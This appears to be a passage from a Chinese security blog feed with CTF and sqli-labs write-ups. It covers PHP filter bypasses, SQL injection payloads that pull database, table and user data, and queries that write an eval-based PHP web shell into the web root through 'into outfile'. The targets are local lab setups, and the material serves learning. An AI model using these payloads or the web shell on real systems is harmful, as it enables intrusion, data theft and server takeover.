$flag);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo('</span><br><span class="line">- have not been found</span><br><span class="line">');</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo '</span><br><span class="line">Invalid password</span><br><span class="line">';</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：ereg()函数搜索一个字符串中的指定字符串，成功true，错误false<br> 传入的值必须是数字或大小写字符<br> 传入的值长度小于8，但要大于9999999</p>
<p>长度和数值矛盾，采用1e8,1x10的8次方，绕过</p>
<p>在可以看到题目是%00截断绕过，可以构造一下payload查看能否返回</p>
<p>没有找到* - *。。。将 - 替换为 * - *试试</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716145651772.png" alt="image-20200716145651772"></p>
<p>这样页面就成功的返回了flag了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716145811973.png" alt="image-20200716145811973"></p>
<h5 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">"flag"</span>;</span></span><br><span class="line">if (isset ($_GET['ctf'])) &#123;</span><br><span class="line">if (@ereg ("^[1-9]+$", $_GET['ctf']) === FALSE)</span><br><span class="line">echo '必须输入数字才行';</span><br><span class="line">else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE)</span><br><span class="line">die('Flag: '.$flag);</span><br><span class="line">else</span><br><span class="line">echo '骚年，继续努力吧啊~';</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>代码审计：ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。所以输入的内容不能是正则中的内容。结合题目是数组绕过，所以跟之前的数组绕过一样，这里等号后面可以跟任何内容</p>
<p>这样进行数组绕过就成功的返回了flag</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716151013505.png" alt="image-20200716151013505"></p>
<h5 id="数字验证正则绕过"><a href="#数字验证正则绕过" class="headerlink" title="数字验证正则绕过"></a>数字验证正则绕过</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="meta">$</span><span class="bash">flag = <span class="string">'flag&#123;test&#125;'</span>;</span></span><br><span class="line">if ("POST" == $_SERVER['REQUEST_METHOD'])&#123;</span><br><span class="line"><span class="meta">	$</span><span class="bash">password = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span></span><br><span class="line">//1、正则匹配，[:graph:]为任意字符，要求password长度超过12</span><br><span class="line">	if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password))&#123;</span><br><span class="line">		echo 'flag';</span><br><span class="line">		exit;</span><br><span class="line">&#125;</span><br><span class="line">while (TRUE)&#123;</span><br><span class="line">//2、password中必须包含标点符号，数字，大写字母，小写字母，并且检测次数要超过6次</span><br><span class="line"><span class="meta">	$</span><span class="bash">reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span></span><br><span class="line">	if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">		break;</span><br><span class="line">//c为字符种类，</span><br><span class="line"><span class="meta">	$</span><span class="bash">c = 0;</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">ps = array(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); </span></span><br><span class="line">	//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]]任何大写字母 [[:lower:]] 任何小写字母</span><br><span class="line">//标点符号，数字，大写字母，小写字母，包含3种以上绕过</span><br><span class="line">	foreach ($ps as $pt)&#123;</span><br><span class="line">		if (preg_match("/[[:$pt:]]+/", $password))</span><br><span class="line"><span class="meta">			$</span><span class="bash">c += 1;</span></span><br><span class="line">	&#125;</span><br><span class="line">	if ($c &lt; 3) break;</span><br><span class="line"><span class="meta">//&gt;</span><span class="bash">=3，必须包含四种类型三种与三种以上</span></span><br><span class="line">//4、弱类型比较，42abc,强制转换为数字</span><br><span class="line">	if ("42" == $password) echo $flag;</span><br><span class="line">	else </span><br><span class="line">		echo 'Wrong password';</span><br><span class="line">	exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>preg_match()</strong></p>
<p>定义：</p>
<ul>
<li>执行一个正则表达式匹配</li>
</ul>
<p>语法：preg_math（pattern,string,matches,flags）</p>
<ul>
<li>pattern,必需，要搜索的模式</li>
<li>string,必需，输入的字符串</li>
<li>返回pattern的匹配次数，0次（不匹配）或1次，匹配成功第一次就会停止搜索。</li>
</ul>
<p><strong>preg_match_all()</strong></p>
<p>与preg_match的区别：</p>
<ul>
<li>返回匹配完整次数（可能是0），或者发生错误后返回FALSE，匹配完整个字符串。</li>
</ul>
<table>
<thead>
<tr>
<th>名字</th>
<th>ASCII</th>
</tr>
</thead>
<tbody><tr>
<td>[:alnum:]</td>
<td>[a-zA-Z0-9]</td>
</tr>
<tr>
<td>[:alpha:]</td>
<td>[a-zA-Z]</td>
</tr>
<tr>
<td>[:ascii:]</td>
<td>[\x00-\x7F]</td>
</tr>
<tr>
<td>[:blank:]</td>
<td>[ \t]</td>
</tr>
<tr>
<td>[:digit:]</td>
<td>[0-9]</td>
</tr>
<tr>
<td>[:graph:]</td>
<td>[\x21-\x7E]</td>
</tr>
<tr>
<td>[:punct:]</td>
<td>[!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{|}~]</td>
</tr>
<tr>
<td>[:lower:]</td>
<td>[a-z]</td>
</tr>
<tr>
<td>[:upper:]</td>
<td>[A-Z]</td>
</tr>
<tr>
<td>[:word:]</td>
<td>[A-Za-z0-9_]</td>
</tr>
<tr>
<td>[:xdigit:]</td>
<td>[A-Fa-f0-9]</td>
</tr>
</tbody></table>
<p>这一关有bug就算只输入?password=都能返回flag</p>
<p>只要能够满足条件都行，是Post传参</p>
<p>payload:<code>42ccccccc.ffffffF</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200716153636587.png" alt="image-20200716153636587"></p>
<h5 id="简单的waf"><a href="#简单的waf" class="headerlink" title="简单的waf"></a>简单的waf</h5><p>打不开</p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第六十三关时间次数限制</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E4%B8%89%E5%85%B3%E6%97%B6%E9%97%B4%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第六十四关时间次数限制</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%85%AD%E5%8D%81%E5%9B%9B%E5%85%B3%E6%97%B6%E9%97%B4%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sql-labs第二十七关a大小写空格绕过</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3a%E5%A4%A7%E5%B0%8F%E5%86%99%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>查看当前字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">将union和select进行大小写，如果不进行大小写会过滤掉</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27a&#x2F;?id&#x3D;11111&quot;  %0a    uNion   %0a   selEct   %0a   1,2,3      %0a       ||&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3a%E5%A4%A7%E5%B0%8F%E5%86%99%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584887976312.png" alt="1584887976312"></p>
<p>查看数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27a&#x2F;?id&#x3D;11111&quot;  %0a    uNion   %0a   selEct   %0a   1,database(),3       %0a       ||&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3a%E5%A4%A7%E5%B0%8F%E5%86%99%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584888041684.png" alt="1584888041684"></p>
<p>查看表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27a&#x2F;?id&#x3D;11111&quot;  %0a    uNion   %0a   selEct   %0a   1,(seLeCt  %0a  group_concat(table_name)from  %0a  information_schema.tables  %0a  where  %0a  table_schema&#x3D;database()),3  %0a       %0a       ||&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3a%E5%A4%A7%E5%B0%8F%E5%86%99%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584888713854.png" alt="1584888713854"></p>
<p>查看users表中字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27a&#x2F;?id&#x3D;11111&quot;  %0a    uNion   %0a   selEct   %0a   1,(seLeCt  %0a  group_concat(column_name)from  %0a  information_schema.columns  %0a  where  %0a  table_name&#x3D;&#39;users&#39;),3  %0a       %0a       ||&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3a%E5%A4%A7%E5%B0%8F%E5%86%99%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584888778221.png" alt="1584888778221"></p>
<p>查看username字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-27a&#x2F;?id&#x3D;11111&quot;  %0a    uNion   %0a   selEct   %0a   1,(seLeCt  %0a  group_concat(username)from  %0a  users),3  %0a       %0a       ||&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3a%E5%A4%A7%E5%B0%8F%E5%86%99%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584888820752.png" alt="1584888820752"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sql-labs第四十五关上传一句话木马</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/</url>
    <content><![CDATA[<p>写入一句话木马得有几个条件</p>
<p>1、root 不一定是root权限，但必须是可写权限</p>
<p>2、一句话木马</p>
<p>3、select     xxx    into  outfile    xxx</p>
<p>4、路径绝对路径</p>
<p>其中0x363636是666的16进制，用666来将数据间进行分割</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[&#39;admin&#39;]);?&gt;&#39; into outfile &#39;D:\\phpStudy\\PHPTutorial\\WWW\\one.php&#39; lines terminated by 0x363636; #</span><br></pre></td></tr></table></figure>

<p>带入也就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这里的意思是，获取users中的所有数据，然后0x363636是666的十六进制，数据的间隔会以666为间隔</span><br><span class="line">select * from users into outfile &#39;D:\\phpStudy\\PHPTutorial\\WWW\\one.php&#39; lines terminated by 0x363636; #</span><br></pre></td></tr></table></figure>



<p>一句话木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;admin&#39;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>绝对路径</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D:\\phpStudy\\PHPTutorial\\WWW</span><br></pre></td></tr></table></figure>

<p>格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &#39;&lt;?php @eval($_POST[&#39;admin&#39;]);?&gt;&#39; into outfile &#39;D:\\phpStudy\\PHPTutorial\\WWW\\one.php&#39; #</span><br></pre></td></tr></table></figure>



<p>查看初始文件有没有one.php，并没有one.php</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585121346724.png" alt="1585121346724"></p>
<p>现在写入一句话木马，点击login登录</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585121616791.png" alt="1585121616791"></p>
<p>查看初始文件是否有one.php文件，成功导入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585121659891.png" alt="1585121659891"></p>
<p>打开one.php文件查看内容，红线处使我们使用中国菜刀或者蚁剑的时候的连接密码</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585121783860.png" alt="1585121783860"></p>
<p>使用中国菜刀连接，成功连接到数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sql-labs%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%BA%94%E5%85%B3%E4%B8%8A%E4%BC%A0%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585121823784.png" alt="1585121823784"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第七关GET盲注</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/</url>
    <content><![CDATA[<p>我们先进入第七关，这里提示错误说我们没有输入带参数的ID值。</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584318790283.png" alt="1584318790283"></p>
<p>我们输入?id=1,页面返回了You are in…. Use outfile……</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584318897307.png" alt="1584318897307"></p>
<p>上面返回了You are in…. Use outfile……而outfile是mysql里面向系统写入文件的函数，然后我们可以尝试写入一句话木马</p>
<p>在写入木马前，先确定注入点，我们经常使用 ‘  “ ) ] 或者其他组合进行闭合，并且在后面加上 and 1=1–+或and 1=2–+ 进行判断闭合的正确性，例如：如果?id=1* and 1=1–+为真，且?id* and 1=2–+为假，那么*字符串就是有效的闭合符，</p>
<p>经过测试我们发现’))字符串可以闭合</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319473364.png" alt="1584319473364"></p>
<p>然后进行测试字段数，使用order by来测试字段数，我们先尝试输入4，发现返回错误，</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319618537.png" alt="1584319618537"></p>
<p>然我在尝试输入3试一下，发现返回正确，我们可以确定当前字段是3</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584319857727.png" alt="1584319857727"></p>
<p>然后我们插入一个文本试试，发现成功地插入了，虽然显示报错了，但是已经插入了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\test.txt&quot; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584322414102.png" alt="1584322414102"></p>
<p>我们可以查看一下，成功地导入了文本</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584322775021.png" alt="1584322775021"></p>
<p>我们现在导入一句话木马，发现也是已经存在了一句话木马，已经成功地导入进去了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">其中一句话木马两边的单引号必须加不然无法导入</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-7&#x2F;?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;123&quot;])?&gt;&#39; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\test.php&quot;--+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323522741.png" alt="1584323522741"></p>
<p>我们查看一下php文本里面是否有我们写入的一句话木马，可以发现我们插入的一句话木马已经存在了，虽然没有显示出来，但确实存在了，我们打开php文件看一下</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323835292.png" alt="1584323835292"></p>
<p>发现确实导入了一句话木马，select……into outfile “地址”的方式插入了一句话木马到服务器，这一用法在我们实战环节中经常会用到。 </p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%83%E5%85%B3GET%E7%9B%B2%E6%B3%A8/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584323882223.png" alt="1584323882223"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs46-49扩展</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs46-49%E6%89%A9%E5%B1%95/</url>
    <content><![CDATA[<p>也可以插入一句话木马。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果这句代码没有将一句话木马写进去的话，是用另外一种方式</span><br><span class="line">select &lt;?php @eval($_POST[admin])?&gt;  into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-49.txt&quot;</span><br></pre></td></tr></table></figure>

<p>使用之前的 <strong>lines terminated</strong>进行数据间分割</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用lines terminated 将一句话木马转换为16进制，插入数据进行分割</span><br><span class="line">select &lt;?php @eval($_POST[admin])?&gt;  into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-49_1.php&quot; lines treminated 0x3c3f70687020406576616c28245f504f53545b61646d696e5d293f3ea</span><br></pre></td></tr></table></figure>

<p>之前学过一个 select *** into outfile “路径”</p>
<p>以49关为例查看能否向之前一样，将信息打印出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;Less-49&#x2F;?sort&#x3D;1&#39; into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\sqli-49.txt&quot; --+</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs46-49%E6%89%A9%E5%B1%95/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585153218678.png" alt="1585153218678"></p>
<p>以上不用管，查看路径中是否有sqli-49.txt这个文件，成功返回</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs46-49%E6%89%A9%E5%B1%95/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585153256162.png" alt="1585153256162"></p>
<p>打开查看内容，成功获取</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs46-49%E6%89%A9%E5%B1%95/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1585153293535.png" alt="1585153293535"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第一关GET联合</title>
    <url>/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/</url>
    <content><![CDATA[<p>这里判断发现1=1 和 1=2 都不报错，判断这不是整形注入</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582992757981.png" alt="1582992757981"></p>
<p>尝试闭合URL输入?id=1’</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582990340046.png" alt="1582990340046"></p>
<p>我们这里使用单引号，有报错信息说明存在注入，没有过滤单引号，为了让单引号闭合，使用#(%23)注释符</p>
<p>报出如上错误，根据错误提示信息<br>the right syntax to use near ‘‘1’’ LIMIT 0,1’ at line 1<br>猜测后端可能是：where id‘用户输入’LIMIT 0,1<br>当用户直接输入***   ’时，造成了闭合<br>这时就需要url的注释符#(%23)来注释，有时#不能用，就要用到#的url编码%23<br>在与注释符#之间就可以进行sql注入，爆出我们想要的内容</p>
<p>使用order by 猜测字段，这里得到字段结果为3。因为3以上报错，输入3时正常</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582990458549.png" alt="1582990458549"></p>
<p>进行联合查询,查询出数据库，这里是security</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582990625060.png" alt="1582990625060"></p>
<p>使用mysql查看一下是否有这个数据库，发现这个数据库</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997014653.png" alt="1582997014653"></p>
<p>查询表名，查询到了下面这四个表名</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997199181.png" alt="1582997199181"></p>
<p>我们用mysql查看一下user里面是否有这些表，发现确实存在</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997449416.png" alt="1582997449416"></p>
<p>用户的账户密码大部分都在users库里面，我们在查询表</p>
<p>查询users表，发现id、username、password等字段</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997307228.png" alt="1582997307228"></p>
<p>我们查看这三个字段，里面是否有我们想要的内容</p>
<p>我们查询这三个字段发现，确实是我们要的账号，密码</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997512920.png" alt="1582997512920"></p>
<p>使用mysql查看一下</p>
<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E4%B8%80%E5%85%B3GET%E8%81%94%E5%90%88/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1582997569358.png" alt="1582997569358"></p>
]]></content>
  </entry>
  <entry>
    <title>sqli-labs关卡/sqli-labs第三十七关POST宽字节</title>
